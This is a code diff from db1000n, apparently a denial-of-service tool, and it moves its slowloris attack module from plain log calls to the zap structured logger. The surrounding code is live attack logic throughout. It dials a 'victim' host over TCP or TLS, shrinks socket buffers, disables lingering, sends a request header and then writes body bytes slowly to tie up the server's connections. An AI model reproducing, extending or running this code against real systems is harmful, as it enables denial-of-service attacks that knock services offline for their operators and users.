@@ -11,6 +11,7 @@ import (
 	"time"
 
 	utls "github.com/refraction-networking/utls"
+	"go.uber.org/zap"
 
 	"github.com/Arriven/db1000n/src/utils/metrics"
 )
@@ -24,6 +25,7 @@ type Config struct {
 	Duration         time.Duration // Duration
 	Path             string        // Target Path. Http POST must be allowed for this Path
 	HostHeader       string        // Host header value in case it is different than the hostname in Path
+	ClientID         string
 }
 
 // SlowLoris is a main logic struct for the package
@@ -39,14 +41,14 @@ var (
 )
 
 // Start starts a slowloris job with specific configuration
-func Start(stopChan chan bool, config *Config) error {
+func Start(stopChan chan bool, logger *zap.Logger, config *Config) error {
 	s := &SlowLoris{
 		Config: config,
 	}
 
 	targetURL, err := url.Parse(config.Path)
 	if err != nil {
-		log.Printf("Cannot parse Path=[%s]: %v", targetURL, err)
+		logger.Debug("cannot parse path", zap.String("path", config.Path), zap.Error(err))
 
 		return err
 	}
@@ -74,7 +76,7 @@ func Start(stopChan chan bool, config *Config) error {
 	go s.activeConnectionsCounter(activeConnectionsCh)
 
 	for i := 0; i < config.DialWorkersCount; i++ {
-		go s.dialWorker(stopChan, config, activeConnectionsCh, targetHostPort, targetURL, requestHeader)
+		go s.dialWorker(stopChan, logger, config, activeConnectionsCh, targetHostPort, targetURL, requestHeader)
 		time.Sleep(dialWorkersLaunchInterval)
 	}
 
@@ -83,7 +85,7 @@ func Start(stopChan chan bool, config *Config) error {
 	return nil
 }
 
-func (s SlowLoris) dialWorker(stopChan chan bool, config *Config, activeConnectionsCh chan<- int, targetHostPort string, targetURI *url.URL, requestHeader []byte) {
+func (s SlowLoris) dialWorker(stopChan chan bool, logger *zap.Logger, config *Config, activeConnectionsCh chan<- int, targetHostPort string, targetURI *url.URL, requestHeader []byte) {
 	isTLS := targetURI.Scheme == "https"
 
 	for {
@@ -93,8 +95,8 @@ func (s SlowLoris) dialWorker(stopChan chan bool, config *Config, activeConnecti
 		default:
 			time.Sleep(config.RampUpInterval)
 
-			if conn := s.dialVictim(targetHostPort, isTLS); conn != nil {
-				go s.doLoris(config, targetHostPort, conn, activeConnectionsCh, requestHeader)
+			if conn := s.dialVictim(logger, targetHostPort, isTLS); conn != nil {
+				go s.doLoris(logger, config, targetHostPort, conn, activeConnectionsCh, requestHeader)
 			}
 		}
 	}
@@ -108,12 +110,12 @@ func (s SlowLoris) activeConnectionsCounter(ch <-chan int) {
 	}
 }
 
-func (s SlowLoris) dialVictim(hostPort string, isTLS bool) io.ReadWriteCloser {
+func (s SlowLoris) dialVictim(logger *zap.Logger, hostPort string, isTLS bool) io.ReadWriteCloser {
 	// TODO: add support for dialing the Path via a random proxy from the given pool.
 	conn, err := net.Dial("tcp", hostPort)
 	if err != nil {
 		metrics.IncSlowLoris(hostPort, "tcp", metrics.StatusFail)
-		log.Printf("Couldn't establish connection to [%s]: %v", hostPort, err)
+		logger.Debug("couldn't establish connection", zap.String("addr", hostPort), zap.Error(err))
 
 		return nil
 	}
@@ -128,21 +130,21 @@ func (s SlowLoris) dialVictim(hostPort string, isTLS bool) io.ReadWriteCloser {
 
 	if err = tcpConn.SetReadBuffer(bufferSize); err != nil {
 		metrics.IncSlowLoris(hostPort, "tcp", metrics.StatusFail)
-		log.Printf("Cannot shrink TCP read buffer: %v", err)
+		logger.Debug("cannot shrink TCP read buffer", zap.Error(err))
 
 		return nil
 	}
 
 	if err = tcpConn.SetWriteBuffer(bufferSize); err != nil {
 		metrics.IncSlowLoris(hostPort, "tcp", metrics.StatusFail)
-		log.Printf("Cannot shrink TCP write buffer: %v", err)
+		logger.Debug("cannot shrink TCP write buffer", zap.Error(err))
 
 		return nil
 	}
 
 	if err = tcpConn.SetLinger(0); err != nil {
 		metrics.IncSlowLoris(hostPort, "tcp", metrics.StatusFail)
-		log.Printf("Cannot disable TCP lingering: %v", err)
+		logger.Debug("cannot disable TCP lingering", zap.Error(err))
 
 		return nil
 	}
@@ -158,7 +160,7 @@ func (s SlowLoris) dialVictim(hostPort string, isTLS bool) io.ReadWriteCloser {
 	if err = tlsConn.Handshake(); err != nil {
 		metrics.IncSlowLoris(hostPort, "tcp", metrics.StatusFail)
 		conn.Close()
-		log.Printf("Couldn't establish tls connection to [%s]: %v", hostPort, err)
+		logger.Debug("couldn't establish tls connection", zap.String("addr", hostPort), zap.Error(err))
 
 		return nil
 	}
@@ -166,12 +168,12 @@ func (s SlowLoris) dialVictim(hostPort string, isTLS bool) io.ReadWriteCloser {
 	return tlsConn
 }
 
-func (s SlowLoris) doLoris(config *Config, destinationHostPort string, conn io.ReadWriteCloser, activeConnectionsCh chan<- int, requestHeader []byte) {
+func (s SlowLoris) doLoris(logger *zap.Logger, config *Config, destinationHostPort string, conn io.ReadWriteCloser, activeConnectionsCh chan<- int, requestHeader []byte) {
 	defer conn.Close()
 
 	if _, err := conn.Write(requestHeader); err != nil {
 		metrics.IncSlowLoris(destinationHostPort, "tcp", metrics.StatusFail)
-		log.Printf("Cannot write requestHeader=[%v]: %v", requestHeader, err)
+		logger.Debug("cannot write requestHeader", zap.ByteString("header", requestHeader), zap.Error(err))
 
 		return
 	}
@@ -180,7 +182,7 @@ func (s SlowLoris) doLoris(config *Config, destinationHostPort string, conn io.R
 	defer func() { activeConnectionsCh <- -1 }()
 
 	readerStopCh := make(chan int, 1)
-	go s.nullReader(conn, readerStopCh)
+	go s.nullReader(logger, conn, readerStopCh)
 
 	for i := 0; i < config.ContentLength; i++ {
 		select {
@@ -191,7 +193,7 @@ func (s SlowLoris) doLoris(config *Config, destinationHostPort string, conn io.R
 
 		if _, err := conn.Write(sharedWriteBuf); err != nil {
 			metrics.IncSlowLoris(destinationHostPort, "tcp", metrics.StatusFail)
-			log.Printf("Error when writing %d byte out of %d bytes: %v", i, config.ContentLength, err)
+			logger.Debug("cannot write bytes", zap.Int("current", i), zap.Int("total", config.ContentLength), zap.Error(err))
 
 			return
 		}
@@ -200,13 +202,13 @@ func (s SlowLoris) doLoris(config *Config, destinationHostPort string, conn io.R
 	}
 }
 
-func (s SlowLoris) nullReader(conn io.Reader, ch chan<- int) {
+func (s SlowLoris) nullReader(logger *zap.Logger, conn io.Reader, ch chan<- int) {
 	defer func() { ch <- 1 }()
 
 	n, err := conn.Read(sharedReadBuf)
 	if err != nil {
-		log.Printf("Error when reading server response: %v", err)
+		logger.Debug("error when reading server response", zap.Error(err))
 	} else {
-		log.Printf("Unexpected response read from server: %v", sharedReadBuf[:n])
+		logger.Debug("unexpected response read from server", zap.ByteString("buffer", sharedReadBuf[:n]))
 	}
 }
